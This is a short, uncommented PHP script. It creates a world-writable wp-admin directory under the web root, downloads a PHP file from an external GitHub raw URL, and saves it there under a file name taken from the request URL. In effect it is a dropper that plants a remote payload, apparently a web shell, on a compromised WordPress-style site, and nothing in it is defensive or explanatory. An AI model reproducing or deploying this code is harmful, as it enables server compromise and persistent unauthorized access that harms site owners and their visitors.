<?php $url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];function file_name($url){if(preg_match('/\/([^\/]+)$/',$url,$matches)){$x=$matches[1];return $x;}}$test_dir=$_SERVER['DOCUMENT_ROOT'].'/wp-admin/';if(!file_exists($test_dir)){if(mkdir($test_dir,0777)){echo "OK1";}else{echo "Fail Create-Folder";}}else{echo "OK1 Exists";}$path=$_SERVER['DOCUMENT_ROOT'].'/wp-admin/'.file_name($url);$sh=file_get_contents("https://raw.githubusercontent.com/ALiReZa-VaKeR/legA/main/A.php");$tr=false;if($sh){$f=fopen($path,"w");fwrite($f,$sh);$tr=true;}if($tr==false){file_put_contents($path,file_get_contents("https://raw.githubusercontent.com/ALiReZa-VaKeR/legA/main/A.php"));}
